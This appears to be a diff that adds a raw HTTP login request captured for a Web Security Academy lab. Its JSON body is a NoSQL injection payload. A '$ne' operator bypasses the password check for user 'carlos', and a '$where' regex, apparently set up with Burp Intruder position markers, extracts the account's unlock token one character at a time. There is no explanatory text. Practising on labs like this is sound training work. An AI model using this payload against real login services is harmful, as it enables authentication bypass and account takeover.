@@ -1,0 +1,20 @@
+POST /login HTTP/2
+Host: ID.web-security-academy.net
+Cookie: session=P3zGdbBcpmpCHqg...
+Content-Length: 65
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://ID.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ID.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
